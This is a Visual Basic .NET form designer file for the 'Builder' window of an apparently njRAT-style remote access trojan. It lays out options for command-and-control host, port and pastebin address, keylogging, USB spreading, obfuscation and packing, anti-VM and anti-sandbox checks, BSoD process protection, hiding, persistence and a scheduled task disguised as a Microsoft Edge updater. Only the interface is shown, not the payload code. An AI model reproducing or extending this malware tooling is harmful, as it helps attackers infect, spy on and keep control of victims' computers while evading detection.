<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Builder
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Builder))
        Me.Button1 = New System.Windows.Forms.Button()
        Me.bsod = New System.Windows.Forms.CheckBox()
        Me.T1 = New System.Windows.Forms.TextBox()
        Me.Isf = New System.Windows.Forms.CheckBox()
        Me.Isu = New System.Windows.Forms.CheckBox()
        Me.klen = New System.Windows.Forms.NumericUpDown()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Anti_CH = New System.Windows.Forms.CheckBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.exe = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.dir = New System.Windows.Forms.ComboBox()
        Me.Idr = New System.Windows.Forms.CheckBox()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.CheckBox6 = New System.Windows.Forms.CheckBox()
        Me.CKUpx = New System.Windows.Forms.CheckBox()
        Me.USB_SP = New System.Windows.Forms.CheckBox()
        Me.CKOBF = New System.Windows.Forms.CheckBox()
        Me.BOT_KILL = New System.Windows.Forms.CheckBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.SLP = New System.Windows.Forms.NumericUpDown()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.PB = New System.Windows.Forms.TextBox()
        Me.PasteE = New System.Windows.Forms.CheckBox()
        Me.VN = New System.Windows.Forms.TextBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.port = New System.Windows.Forms.NumericUpDown()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.host = New System.Windows.Forms.TextBox()
        Me.Y = New System.Windows.Forms.TextBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.HIDE_ME = New System.Windows.Forms.CheckBox()
        Me.Persis = New System.Windows.Forms.CheckBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.CheckBox4 = New System.Windows.Forms.CheckBox()
        Me.CheckBox5 = New System.Windows.Forms.CheckBox()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.TextBox3 = New System.Windows.Forms.TextBox()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.Label12 = New System.Windows.Forms.Label()
        CType(Me.klen, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox1.SuspendLayout()
        CType(Me.SLP, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox2.SuspendLayout()
        CType(Me.port, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox3.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox4.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Button1
        '
        Me.Button1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button1.Font = New System.Drawing.Font("Arial", 14.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Button1.ForeColor = System.Drawing.Color.White
        Me.Button1.Image = CType(resources.GetObject("Button1.Image"), System.Drawing.Image)
        Me.Button1.Location = New System.Drawing.Point(262, 348)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(286, 50)
        Me.Button1.TabIndex = 6
        Me.Button1.Text = " Build Client"
        Me.Button1.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.Button1.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageBeforeText
        Me.Button1.UseVisualStyleBackColor = True
        '
        'bsod
        '
        Me.bsod.AutoSize = True
        Me.bsod.Cursor = System.Windows.Forms.Cursors.Hand
        Me.bsod.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.bsod.ForeColor = System.Drawing.Color.White
        Me.bsod.Location = New System.Drawing.Point(8, 19)
        Me.bsod.Name = "bsod"
        Me.bsod.Size = New System.Drawing.Size(154, 18)
        Me.bsod.TabIndex = 11
        Me.bsod.Text = "Protect Process (BSoD)"
        Me.bsod.UseVisualStyleBackColor = True
        '
        'T1
        '
        Me.T1.BackColor = System.Drawing.Color.Black
        Me.T1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.T1.ForeColor = System.Drawing.Color.White
        Me.T1.Location = New System.Drawing.Point(755, 420)
        Me.T1.Multiline = True
        Me.T1.Name = "T1"
        Me.T1.Size = New System.Drawing.Size(100, 20)
        Me.T1.TabIndex = 12
        Me.T1.Visible = False
        '
        'Isf
        '
        Me.Isf.AutoSize = True
        Me.Isf.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Isf.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Isf.ForeColor = System.Drawing.Color.White
        Me.Isf.Location = New System.Drawing.Point(8, 43)
        Me.Isf.Name = "Isf"
        Me.Isf.Size = New System.Drawing.Size(113, 18)
        Me.Isf.TabIndex = 13
        Me.Isf.Text = "Copy To StartUp"
        Me.Isf.UseVisualStyleBackColor = True
        '
        'Isu
        '
        Me.Isu.AutoSize = True
        Me.Isu.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Isu.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Isu.ForeColor = System.Drawing.Color.White
        Me.Isu.Location = New System.Drawing.Point(8, 67)
        Me.Isu.Name = "Isu"
        Me.Isu.Size = New System.Drawing.Size(115, 18)
        Me.Isu.TabIndex = 14
        Me.Isu.Text = "Registry StartUp"
        Me.Isu.UseVisualStyleBackColor = True
        '
        'klen
        '
        Me.klen.BackColor = System.Drawing.Color.Black
        Me.klen.ForeColor = System.Drawing.Color.White
        Me.klen.Location = New System.Drawing.Point(213, 206)
        Me.klen.Maximum = New Decimal(New Integer() {512, 0, 0, 0})
        Me.klen.Minimum = New Decimal(New Integer() {5, 0, 0, 0})
        Me.klen.Name = "klen"
        Me.klen.Size = New System.Drawing.Size(67, 20)
        Me.klen.TabIndex = 15
        Me.klen.Value = New Decimal(New Integer() {20, 0, 0, 0})
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label6.ForeColor = System.Drawing.Color.White
        Me.Label6.Location = New System.Drawing.Point(3, 208)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(85, 14)
        Me.Label6.TabIndex = 16
        Me.Label6.Text = "KeyLogs in KB"
        '
        'Anti_CH
        '
        Me.Anti_CH.AutoSize = True
        Me.Anti_CH.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Anti_CH.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Anti_CH.ForeColor = System.Drawing.Color.White
        Me.Anti_CH.Location = New System.Drawing.Point(8, 139)
        Me.Anti_CH.Name = "Anti_CH"
        Me.Anti_CH.Size = New System.Drawing.Size(240, 18)
        Me.Anti_CH.TabIndex = 17
        Me.Anti_CH.Text = "Anti's (VMWare, Sandboxie, Virtualbox)"
        Me.Anti_CH.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.ForeColor = System.Drawing.Color.White
        Me.Label3.Location = New System.Drawing.Point(3, 16)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(57, 14)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "ExeName"
        '
        'exe
        '
        Me.exe.BackColor = System.Drawing.Color.Black
        Me.exe.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.exe.Enabled = False
        Me.exe.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.exe.ForeColor = System.Drawing.Color.White
        Me.exe.Location = New System.Drawing.Point(6, 32)
        Me.exe.Name = "exe"
        Me.exe.Size = New System.Drawing.Size(241, 20)
        Me.exe.TabIndex = 5
        Me.exe.Text = "Client.exe"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.ForeColor = System.Drawing.Color.White
        Me.Label4.Location = New System.Drawing.Point(3, 57)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(57, 14)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "Directory"
        '
        'dir
        '
        Me.dir.BackColor = System.Drawing.Color.Black
        Me.dir.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.dir.Enabled = False
        Me.dir.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.dir.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.dir.ForeColor = System.Drawing.Color.White
        Me.dir.FormattingEnabled = True
        Me.dir.Items.AddRange(New Object() {"%TEMP%", "%AppData%", "%UserProfile%", "%AllUsersProfile%", "%WinDir%"})
        Me.dir.Location = New System.Drawing.Point(6, 73)
        Me.dir.Name = "dir"
        Me.dir.Size = New System.Drawing.Size(241, 22)
        Me.dir.TabIndex = 7
        '
        'Idr
        '
        Me.Idr.AutoSize = True
        Me.Idr.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Idr.ForeColor = System.Drawing.Color.White
        Me.Idr.Location = New System.Drawing.Point(196, 12)
        Me.Idr.Name = "Idr"
        Me.Idr.Size = New System.Drawing.Size(54, 18)
        Me.Idr.TabIndex = 14
        Me.Idr.Text = "Copy"
        Me.Idr.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Idr)
        Me.GroupBox1.Controls.Add(Me.dir)
        Me.GroupBox1.Controls.Add(Me.Label4)
        Me.GroupBox1.Controls.Add(Me.exe)
        Me.GroupBox1.Controls.Add(Me.Label3)
        Me.GroupBox1.Controls.Add(Me.CheckBox6)
        Me.GroupBox1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox1.ForeColor = System.Drawing.Color.White
        Me.GroupBox1.Location = New System.Drawing.Point(6, 131)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(253, 105)
        Me.GroupBox1.TabIndex = 5
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Installation Settings"
        '
        'CheckBox6
        '
        Me.CheckBox6.AutoSize = True
        Me.CheckBox6.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox6.ForeColor = System.Drawing.Color.White
        Me.CheckBox6.Location = New System.Drawing.Point(140, 12)
        Me.CheckBox6.Name = "CheckBox6"
        Me.CheckBox6.Size = New System.Drawing.Size(50, 18)
        Me.CheckBox6.TabIndex = 15
        Me.CheckBox6.Text = "Melt"
        Me.CheckBox6.UseVisualStyleBackColor = True
        '
        'CKUpx
        '
        Me.CKUpx.AutoSize = True
        Me.CKUpx.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CKUpx.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CKUpx.ForeColor = System.Drawing.Color.White
        Me.CKUpx.Location = New System.Drawing.Point(6, 44)
        Me.CKUpx.Name = "CKUpx"
        Me.CKUpx.Size = New System.Drawing.Size(148, 18)
        Me.CKUpx.TabIndex = 20
        Me.CKUpx.Text = "MPress Compression"
        Me.CKUpx.UseVisualStyleBackColor = True
        '
        'USB_SP
        '
        Me.USB_SP.AutoSize = True
        Me.USB_SP.Cursor = System.Windows.Forms.Cursors.Hand
        Me.USB_SP.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.USB_SP.ForeColor = System.Drawing.Color.White
        Me.USB_SP.Location = New System.Drawing.Point(8, 163)
        Me.USB_SP.Name = "USB_SP"
        Me.USB_SP.Size = New System.Drawing.Size(89, 18)
        Me.USB_SP.TabIndex = 18
        Me.USB_SP.Text = "Spread USB"
        Me.USB_SP.UseVisualStyleBackColor = True
        '
        'CKOBF
        '
        Me.CKOBF.AutoSize = True
        Me.CKOBF.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CKOBF.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CKOBF.ForeColor = System.Drawing.Color.White
        Me.CKOBF.Location = New System.Drawing.Point(8, 187)
        Me.CKOBF.Name = "CKOBF"
        Me.CKOBF.Size = New System.Drawing.Size(92, 18)
        Me.CKOBF.TabIndex = 19
        Me.CKOBF.Text = "Obfuscation"
        Me.CKOBF.UseVisualStyleBackColor = True
        '
        'BOT_KILL
        '
        Me.BOT_KILL.AutoSize = True
        Me.BOT_KILL.Cursor = System.Windows.Forms.Cursors.Hand
        Me.BOT_KILL.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.BOT_KILL.ForeColor = System.Drawing.Color.White
        Me.BOT_KILL.Location = New System.Drawing.Point(7, 68)
        Me.BOT_KILL.Name = "BOT_KILL"
        Me.BOT_KILL.Size = New System.Drawing.Size(72, 18)
        Me.BOT_KILL.TabIndex = 20
        Me.BOT_KILL.Text = "BotKiller"
        Me.BOT_KILL.UseVisualStyleBackColor = True
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label7.ForeColor = System.Drawing.Color.White
        Me.Label7.Location = New System.Drawing.Point(6, 292)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(117, 14)
        Me.Label7.TabIndex = 22
        Me.Label7.Text = "Sleep (1 = 1 Second)"
        '
        'SLP
        '
        Me.SLP.BackColor = System.Drawing.Color.Black
        Me.SLP.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.SLP.ForeColor = System.Drawing.Color.White
        Me.SLP.Location = New System.Drawing.Point(213, 290)
        Me.SLP.Maximum = New Decimal(New Integer() {9000000, 0, 0, 0})
        Me.SLP.Name = "SLP"
        Me.SLP.Size = New System.Drawing.Size(67, 20)
        Me.SLP.TabIndex = 23
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.PB)
        Me.GroupBox2.Controls.Add(Me.PasteE)
        Me.GroupBox2.Controls.Add(Me.VN)
        Me.GroupBox2.Controls.Add(Me.Label5)
        Me.GroupBox2.Controls.Add(Me.port)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Controls.Add(Me.host)
        Me.GroupBox2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox2.ForeColor = System.Drawing.Color.White
        Me.GroupBox2.Location = New System.Drawing.Point(4, 1)
        Me.GroupBox2.Margin = New System.Windows.Forms.Padding(2)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Padding = New System.Windows.Forms.Padding(2)
        Me.GroupBox2.Size = New System.Drawing.Size(253, 125)
        Me.GroupBox2.TabIndex = 24
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Connection Settings"
        '
        'PB
        '
        Me.PB.BackColor = System.Drawing.Color.Black
        Me.PB.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.PB.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.PB.ForeColor = System.Drawing.Color.White
        Me.PB.Location = New System.Drawing.Point(5, 98)
        Me.PB.Name = "PB"
        Me.PB.Size = New System.Drawing.Size(242, 20)
        Me.PB.TabIndex = 33
        Me.PB.Text = "https://pastebin.com/raw/EngADTbC"
        '
        'PasteE
        '
        Me.PasteE.AutoSize = True
        Me.PasteE.Cursor = System.Windows.Forms.Cursors.Hand
        Me.PasteE.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.PasteE.ForeColor = System.Drawing.Color.White
        Me.PasteE.Location = New System.Drawing.Point(5, 79)
        Me.PasteE.Name = "PasteE"
        Me.PasteE.Size = New System.Drawing.Size(226, 18)
        Me.PasteE.TabIndex = 32
        Me.PasteE.Text = "Pastebin ( host:port / 127.0.0.1:5552  )"
        Me.PasteE.UseVisualStyleBackColor = True
        '
        'VN
        '
        Me.VN.BackColor = System.Drawing.Color.Black
        Me.VN.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.VN.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.VN.ForeColor = System.Drawing.Color.White
        Me.VN.Location = New System.Drawing.Point(67, 56)
        Me.VN.Name = "VN"
        Me.VN.Size = New System.Drawing.Size(180, 20)
        Me.VN.TabIndex = 22
        Me.VN.Text = "HacKed"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.ForeColor = System.Drawing.Color.White
        Me.Label5.Location = New System.Drawing.Point(3, 58)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(62, 14)
        Me.Label5.TabIndex = 21
        Me.Label5.Text = "Campaign"
        '
        'port
        '
        Me.port.BackColor = System.Drawing.Color.Black
        Me.port.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.port.ForeColor = System.Drawing.Color.White
        Me.port.Location = New System.Drawing.Point(190, 30)
        Me.port.Maximum = New Decimal(New Integer() {60000, 0, 0, 0})
        Me.port.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.port.Name = "port"
        Me.port.Size = New System.Drawing.Size(57, 20)
        Me.port.TabIndex = 20
        Me.port.Value = New Decimal(New Integer() {1177, 0, 0, 0})
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.White
        Me.Label2.Location = New System.Drawing.Point(191, 14)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(30, 14)
        Me.Label2.TabIndex = 19
        Me.Label2.Text = "Port"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.White
        Me.Label1.Location = New System.Drawing.Point(3, 14)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(32, 14)
        Me.Label1.TabIndex = 18
        Me.Label1.Text = "Host"
        '
        'host
        '
        Me.host.BackColor = System.Drawing.Color.Black
        Me.host.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.host.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.host.ForeColor = System.Drawing.Color.White
        Me.host.Location = New System.Drawing.Point(5, 30)
        Me.host.Name = "host"
        Me.host.Size = New System.Drawing.Size(176, 20)
        Me.host.TabIndex = 17
        Me.host.Text = "127.0.0.1"
        '
        'Y
        '
        Me.Y.BackColor = System.Drawing.Color.Black
        Me.Y.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Y.Enabled = False
        Me.Y.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Y.ForeColor = System.Drawing.Color.White
        Me.Y.Location = New System.Drawing.Point(962, 291)
        Me.Y.Name = "Y"
        Me.Y.Size = New System.Drawing.Size(48, 20)
        Me.Y.TabIndex = 24
        Me.Y.Text = "|Ghost|"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label8.ForeColor = System.Drawing.Color.White
        Me.Label8.Location = New System.Drawing.Point(961, 274)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(27, 14)
        Me.Label8.TabIndex = 23
        Me.Label8.Text = "Key"
        '
        'HIDE_ME
        '
        Me.HIDE_ME.AutoSize = True
        Me.HIDE_ME.Cursor = System.Windows.Forms.Cursors.Hand
        Me.HIDE_ME.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.HIDE_ME.ForeColor = System.Drawing.Color.White
        Me.HIDE_ME.Location = New System.Drawing.Point(8, 91)
        Me.HIDE_ME.Name = "HIDE_ME"
        Me.HIDE_ME.Size = New System.Drawing.Size(85, 18)
        Me.HIDE_ME.TabIndex = 25
        Me.HIDE_ME.Text = "Hide Client"
        Me.HIDE_ME.UseVisualStyleBackColor = True
        '
        'Persis
        '
        Me.Persis.AutoSize = True
        Me.Persis.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Persis.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Persis.ForeColor = System.Drawing.Color.White
        Me.Persis.Location = New System.Drawing.Point(8, 115)
        Me.Persis.Name = "Persis"
        Me.Persis.Size = New System.Drawing.Size(93, 18)
        Me.Persis.TabIndex = 26
        Me.Persis.Text = "Persistence"
        Me.Persis.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Label13)
        Me.GroupBox3.Controls.Add(Me.ComboBox1)
        Me.GroupBox3.Controls.Add(Me.PictureBox2)
        Me.GroupBox3.Controls.Add(Me.Label7)
        Me.GroupBox3.Controls.Add(Me.CKOBF)
        Me.GroupBox3.Controls.Add(Me.SLP)
        Me.GroupBox3.Controls.Add(Me.TextBox2)
        Me.GroupBox3.Controls.Add(Me.Label10)
        Me.GroupBox3.Controls.Add(Me.bsod)
        Me.GroupBox3.Controls.Add(Me.CheckBox4)
        Me.GroupBox3.Controls.Add(Me.Isf)
        Me.GroupBox3.Controls.Add(Me.CheckBox5)
        Me.GroupBox3.Controls.Add(Me.Isu)
        Me.GroupBox3.Controls.Add(Me.Persis)
        Me.GroupBox3.Controls.Add(Me.klen)
        Me.GroupBox3.Controls.Add(Me.Label6)
        Me.GroupBox3.Controls.Add(Me.HIDE_ME)
        Me.GroupBox3.Controls.Add(Me.Anti_CH)
        Me.GroupBox3.Controls.Add(Me.USB_SP)
        Me.GroupBox3.Cursor = System.Windows.Forms.Cursors.Hand
        Me.GroupBox3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox3.ForeColor = System.Drawing.Color.White
        Me.GroupBox3.Location = New System.Drawing.Point(262, 1)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(286, 341)
        Me.GroupBox3.TabIndex = 27
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Options 1"
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label13.ForeColor = System.Drawing.Color.White
        Me.Label13.Location = New System.Drawing.Point(6, 316)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(143, 14)
        Me.Label13.TabIndex = 32
        Me.Label13.Text = ".NET Framework Version"
        '
        'ComboBox1
        '
        Me.ComboBox1.BackColor = System.Drawing.Color.Black
        Me.ComboBox1.ForeColor = System.Drawing.Color.White
        Me.ComboBox1.FormattingEnabled = True
        Me.ComboBox1.Items.AddRange(New Object() {"v2.0.50727", "v3.0", "v3.5", "v4.0.30319"})
        Me.ComboBox1.Location = New System.Drawing.Point(155, 313)
        Me.ComboBox1.Name = "ComboBox1"
        Me.ComboBox1.Size = New System.Drawing.Size(125, 22)
        Me.ComboBox1.TabIndex = 31
        '
        'PictureBox2
        '
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(159, 19)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(20, 20)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox2.TabIndex = 30
        Me.PictureBox2.TabStop = False
        '
        'TextBox2
        '
        Me.TextBox2.BackColor = System.Drawing.Color.Black
        Me.TextBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBox2.ForeColor = System.Drawing.Color.White
        Me.TextBox2.Location = New System.Drawing.Point(79, 269)
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(204, 20)
        Me.TextBox2.TabIndex = 29
        Me.TextBox2.Text = "MicrosoftEdgeUpdateTaskMachine"
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label10.ForeColor = System.Drawing.Color.White
        Me.Label10.Location = New System.Drawing.Point(6, 271)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(67, 14)
        Me.Label10.TabIndex = 15
        Me.Label10.Text = "Task Name"
        '
        'CheckBox4
        '
        Me.CheckBox4.AutoSize = True
        Me.CheckBox4.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox4.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBox4.Location = New System.Drawing.Point(8, 250)
        Me.CheckBox4.Name = "CheckBox4"
        Me.CheckBox4.Size = New System.Drawing.Size(120, 18)
        Me.CheckBox4.TabIndex = 29
        Me.CheckBox4.Text = "Scheduled Tasks"
        Me.CheckBox4.UseVisualStyleBackColor = True
        '
        'CheckBox5
        '
        Me.CheckBox5.AutoSize = True
        Me.CheckBox5.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox5.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBox5.Location = New System.Drawing.Point(8, 226)
        Me.CheckBox5.Name = "CheckBox5"
        Me.CheckBox5.Size = New System.Drawing.Size(146, 18)
        Me.CheckBox5.TabIndex = 27
        Me.CheckBox5.Text = "Anti ANY.RUN Sandbox"
        Me.CheckBox5.UseVisualStyleBackColor = True
        '
